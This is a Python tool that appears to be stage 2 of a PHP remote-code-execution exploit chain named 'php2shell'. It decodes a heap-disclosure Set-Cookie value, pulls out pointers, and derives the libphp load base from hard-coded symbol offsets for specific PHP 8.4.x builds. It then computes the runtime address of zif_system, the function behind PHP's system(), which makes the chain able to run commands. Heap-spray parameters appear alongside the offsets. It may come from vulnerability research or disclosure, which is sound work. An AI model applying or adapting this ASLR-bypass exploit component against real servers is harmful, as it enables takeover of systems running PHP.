#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

"""Stage 2: decode the disclosure cookie ourselves.

The consumer request of this chain answers with a `Set-Cookie` whose value is a
percent-encoded window of destroyed request heap. Reading it as text tells you
nothing; reading it as *addresses* is the whole leak. This tool does that and
prints the arithmetic, so the leak stops being magic:

  1. percent-decode the cookie value,
  2. slide an 8-byte window over it and keep the qwords that look like user-space
     pointers (aarch64: 0x0000_7f.._...._...., x86_64 similar),
  3. histogram the pointers masked to 2 MiB: Zend's memory manager hands out
     chunks on 2 MiB boundaries, so the most common base is the chunk base,
  4. find repeated qwords and subtract known symbol offsets: inside one mapping
     the difference between two symbols is constant, so `qword - zval_ptr_dtor`
     lands on the libphp load base. The base that repeats is the answer.

Input is one of:
    --value '<cookie value>'      the raw header value
    --cookie-file path           a file holding the header value (or a full header)
    --dump path                  raw bytes already percent-decoded

Nothing here talks to a target: it analyses a cookie you already captured.

Usage:
    python3 decode_leak_cookie.py --cookie-file /tmp/cookie.txt
    python3 decode_leak_cookie.py --cookie-file /tmp/cookie.txt \
        --symbol zval_ptr_dtor=0x638120 --symbol zend_hash_destroy=0x5eefc8
"""

import argparse
import json
import re
import sys
from collections import Counter
from urllib.parse import unquote_to_bytes

# Offsets inside libphp, keyed by architecture, PHP version and - for distribution packages - the
# distribution. Two keys with the same version are different binaries: `8.4.26` is the official
# php:8.4.26-apache image, `8.4.24+debian13` is Debian's libapache2-mod-php8.4 8.4.24-1~deb13u1
# (build-id a53126ca5ef3f1c12e9bd48cf7cccd63698fc818). A package build never silently inherits the
# official-image offsets. The architecture is never guessed from the build number either - probe.php
# reports it, the leak also reveals it, and --arch overrides both.
#
# Besides the symbols a profile carries the two heap slots (s_off, hsv_off) and the arming/spray
# shape (spray_first, fillers, sid_field), because those are build constants too. `hsv` is the
# zend_reference that php_session_track_init stores in ps_globals+0x168, not a string.
SYMBOL_PROFILES = {
    "x86_64/8.4.26": {
        "zval_ptr_dtor": 0x65EB60,
        "zend_hash_destroy": 0x6138F0,
        "php_url_encode": 0x4BC590,
        "zif_system": 0x465370,
        "s_off": 0xF8398,
        "hsv_off": 0x7D720,
        "spray_first": 8,
        "fillers": 115,
    },
    "arm64/8.4.26": {
        "zval_ptr_dtor": 0x638120,
        "zend_hash_destroy": 0x5eefc8,
        "php_url_encode": 0x484820,
        "zif_system": 0x42cd70,
        "s_off": 0xF8398,
        "hsv_off": 0x7D720,
        "spray_first": 8,
        "fillers": 115,
    },
    "x86_64/8.4.24+debian13": {
        "zval_ptr_dtor": 0x424FF0,
        "zend_hash_destroy": 0x3D9570,
        "php_url_encode": 0x2A4250,
        "zif_system": 0x24CDD0,
        "s_off": 0xF7398,
        "hsv_off": 0x7D6E0,
        "spray_first": 8,
        "fillers": 116,
        "sid_field": 1,
    },
    "arm64/8.4.24+debian13": {
        "zval_ptr_dtor": 0x41F9E0,
        "zend_hash_destroy": 0x3D32E0,
        "php_url_encode": 0x289E60,
        "zif_system": 0x230FB0,
        "s_off": 0xF7398,
        "hsv_off": 0x7D720,
        "spray_first": 8,
        "fillers": 116,
        "sid_field": 1,
    },
}
DEFAULT_PROFILE = "arm64/8.4.26"
DEFAULT_SYMBOLS = SYMBOL_PROFILES[DEFAULT_PROFILE]


def profile_key(arch, version, distro):
    """Name of the offset profile for a target, preferring the distribution-specific one.

    A version alone is only enough for the official image; a package build of the same version is a
    different binary whose offsets are tens of MB away. Falling back to the version key when the
    distribution has no profile keeps the old behaviour for the official image.
    """
    if distro:
        specific = "%s/%s+%s" % (arch, version, distro)
        if specific in SYMBOL_PROFILES:
            return specific
    return "%s/%s" % (arch, version)

CHUNK_MASK = ~0x1FFFFF  # Zend MM chunks are 2 MiB aligned

# What counts as a user-space pointer. The first version of this was 0x7f00_0000_0000..0x8000_0000_0000,
# which is where the arm64 kernel puts mmap - and on x86-64 under WSL the heap came back at 0x749f_....,
# i.e. below the range, so a full 800 KiB window was reported as holding no pointers at all. The test is
# now the one that is true on any 64-bit target: above the null page, and in the lower canonical half.
MIN_PTR = 0x0000_0000_0001_0000      # above the null page
MAX_PTR = 0x0000_8000_0000_0000      # bit 47 clear: user space on 4- and 5-level paging
# A load base is a real mapping, so it sits far above the null page. Pointer-shaped integers in the
# leak (0x100000000, 0x700000000, 0x1600000000) pass the pointer test and otherwise outvote the module
# base by sheer count, which then also breaks the chunk selection that keys off it.
MIN_BASE = 0x0000_0002_0000_0000


def load_cookie(args):
    if args.value is not None:
        return args.value.strip()
    if args.dump is not None:
        with open(args.dump, "rb") as handle:
            return handle.read()
    with open(args.cookie_file, "r", encoding="utf-8", errors="replace") as handle:
        raw = handle.read()
    # Accept a whole header line as well as a bare value.
    match = re.search(r"(?i)set-cookie\s*:\s*(.+)", raw)
    line = match.group(1) if match else raw
    return line.split(";")[0].strip().split("=", 1)[-1] if "=" in line.split("\r\n")[0] and ";" in line else line.strip()


def to_bytes(value):
    """Undo exactly what php_session_send_cookie did to the leaked bytes.

    The cookie is built with php_url_encode (the urlencode flavour), not rawurlencode: besides the
    %XX escapes it turns a space into '+'. Bytes that happen to be 0x20 therefore come back as '+',
    which has to be mapped back before qwords are read - and it is lossless, because a literal 0x2B
    in memory is sent as %2B. This matters here: zval_ptr_dtor sits at libphp+0x638120, so every
    leaked copy of it has a space in its low byte.
    """
    if isinstance(value, bytes):
        return value
    out = bytearray()
    index, size = 0, len(value)
    while index < size:
        char = value[index]
        if char == "%" and index + 2 < size:
            try:
                out.append(int(value[index + 1:index + 3], 16))
                index += 3
                continue
            except ValueError:
                pass
        elif char == "+":
            out.append(0x20)
            index += 1
            continue
        out.append(ord(char))
        index += 1
    return bytes(out)


def looks_like_pointer(qword):
    return MIN_PTR <= qword < MAX_PTR


def detect_arch(blob):
    """Guess the architecture from the leaked pointer set, or None when it is not clear.

    The arm64 kernel hands out mmap addresses from the very top of the 47-bit space, so bits 32..47 of
    every chunk base there are 0x7ff0..0x7fff. x86-64 randomises over a much wider band (0x74xx..0x7fxx
    in the runs we have) and lands there about once in four thousand. That is a heuristic, not a
    measurement: probe.php reports php_uname('m') and wins when it is available, and --arch overrides
    both.

    The vote is taken over chunk bases, not over every pointer-shaped qword. The window also carries
    small integers (0x100000000, 0x1600000000) that pass looks_like_pointer(), and counting them once
    pushed an arm64 leak below the old 90% threshold - the heap sat at 0x7ffe..., not 0x7fff..., which
    made the whole run take the x86-64 offsets.
    """
    qwords = [int.from_bytes(blob[i:i + 8], "little") for i in range(0, len(blob) - 7, 8)]
    chunks = [q & CHUNK_MASK for q in qwords if MIN_BASE <= q < MAX_PTR]
    if len(chunks) < 64:
        return None
    top = Counter((q >> 32) & 0xFFFF for q in chunks).most_common(1)[0]
    if top[0] >= 0x7FF0 and top[1] * 2 >= len(chunks):
        return "arm64"
    return "x86_64"


def slide_pointers(blob):
    """Collect (offset, qword) for every 8-byte window that holds a pointer."""
    hits = []
    for offset in range(1, max(1, len(blob) - 7)):
        qword = int.from_bytes(blob[offset:offset + 8], "little")
        if looks_like_pointer(qword):
            hits.append((offset, qword))
    return hits


def summarise(blob, symbols):
    hits = slide_pointers(blob)
    qwords = [q for _, q in hits]

    bases = Counter((q & CHUNK_MASK) for q in qwords)
    top_base, top_count = (bases.most_common(1)[0] if bases else (0, 0))

    repeated = [(q, n) for q, n in Counter(qwords).items() if n >= 2]
    symbol_hits = []
    for qword, count in sorted(repeated, key=lambda item: -item[1]):
        for name, offset in symbols.items():
            candidate = qword - offset
            if candidate & 0xFFF or candidate < MIN_BASE:  # a load base is page aligned and high
                continue
            if top_base and abs(candidate - top_base) > (512 << 20):
                continue
            symbol_hits.append({"symbol": name, "qword": qword, "count": count, "base": candidate})

    # Even a pointer that appears once is evidence: if two *different* qwords
    # minus two different offsets land on the same page-aligned base, that base
    # is a candidate load address. One vote alone is noise, so we require 2+.
    votes = Counter()
    for qword in set(qwords):
        for name, offset in symbols.items():
            candidate = qword - offset
            if candidate & 0xFFF or not (MIN_BASE <= candidate < MAX_PTR):
                continue
            if top_base and abs(candidate - top_base) > (512 << 20):
                continue
            votes[candidate] += 1

    # A single symbol offset can be enough: 900 nested POST arrays put ~900 copies of
    # zval_ptr_dtor into the window, so one fingerprint backed by a large cluster is much stronger
    # evidence than two coincidences. Rank by the number of pointers behind a candidate, not by how
    # many different symbols happen to hit it - two symbols landing on a 4-pointer page used to win
    # over one symbol with 876 pointers.
    weighted = Counter()
    for hit in symbol_hits:
        weighted[hit["base"]] += hit["count"]
    libphp_base, libphp_weight = (weighted.most_common(1)[0] if weighted else (0, 0))

    return {
        "decoded_bytes": len(blob),
        "pointer_windows": len(hits),
        "distinct_pointers": len(set(qwords)),
        "unique_offsets_mod_8": sorted({offset % 8 for offset, _ in hits}),
        "chunk_base": top_base,
        "chunk_base_votes": top_count,
        "chunk_base_share": round(top_count / len(hits), 3) if hits else 0.0,
        "other_bases": [(hex(base), count) for base, count in bases.most_common(16)[1:]],
        "repeated_qwords": len(repeated),
        "symbol_hits": symbol_hits[:10],
        "libphp_base": libphp_base,
        "libphp_votes": libphp_weight,
        "libphp_weight": libphp_weight,
    }


def main(argv=None):
    ap = argparse.ArgumentParser(description="decode the php2shell disclosure cookie")
    source = ap.add_mutually_exclusive_group(required=True)
    source.add_argument("--value", help="raw cookie value (percent-encoded)")
    source.add_argument("--cookie-file", help="file with the cookie value or the whole header")
    source.add_argument("--dump", help="file with already percent-decoded bytes")
    ap.add_argument("--symbol", action="append", default=[],
                    help="name=offset pairs used as fingerprints, e.g. zval_ptr_dtor=0x638120")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--sample", type=int, default=6, help="how many pointer samples to print")
    args = ap.parse_args(argv)

    symbols = dict(DEFAULT_SYMBOLS)
    for item in args.symbol:
        name, _, offset = item.partition("=")
        symbols[name.strip()] = int(offset.strip(), 0)

    blob = to_bytes(load_cookie(args))
    result = summarise(blob, symbols)

    if args.json:
        print(json.dumps(result, indent=2))
        return 0

    printable = sum(1 for byte in blob if 32 <= byte < 127)
    print("decoded %d bytes (%d%% printable) -> %s" % (
        len(blob),
        round(100 * printable / len(blob)) if blob else 0,
        "binary/heap" if printable * 3 < len(blob) else "mostly text",
    ))

    samples = slide_pointers(blob)[:args.sample]
    if samples:
        print("\nfirst pointer-shaped qwords:")
        for offset, qword in samples:
            print("  +0x%04x  %#018x  (chunk page %#x)" % (offset, qword, qword & CHUNK_MASK))
    else:
        print("\nno user-space pointers found -> not a disclosure window?")
        return 1

    print("\nchunk base   : %#x   (%d/%d pointers, %d%%)" % (
        result["chunk_base"], result["chunk_base_votes"], result["pointer_windows"],
        round(100 * result["chunk_base_share"]),
    ))
    if len(result["other_bases"]) > 1:
        print("other bases  : %s" % ", ".join("%sx%d" % (b, c) for b, c in result["other_bases"][:4]))

    if result["symbol_hits"]:
        print("\nrepeated qwords matched against symbol offsets:")
        for hit in result["symbol_hits"]:
            print("  %#x x%d  - %s(0x%x) = %#x" % (
                hit["qword"], hit["count"], hit["symbol"], symbols[hit["symbol"]], hit["base"]))
        if result["libphp_base"] and (result["libphp_votes"] >= 2 or result["libphp_weight"] >= 16):
            print("\nlibphp base  : %#x   (%d agreeing symbols, %d pointers in the cluster)"
                  % (result["libphp_base"], result["libphp_votes"], result["libphp_weight"]))
            print("=> zif_system would be %#x" % (result["libphp_base"] + symbols.get("zif_system", 0x42cd70)))
            if result["chunk_base"]:
                delta = result["libphp_base"] - result["chunk_base"]
                print("=> libphp - disclosed chunk = %s%#x (%d pages)"
                      % ("-" if delta < 0 else "", abs(delta), abs(delta) >> 12))
        else:
            print("\nlibphp base  : not determined (need two symbols, or one cluster of 16+ pointers)")
    else:
        print("\nlibphp base  : not determined (no repeated qword matched a symbol offset)")
        print("               a chunk-only cookie is normal for a short disclosure window")
    return 0


if __name__ == "__main__":
    sys.exit(main())
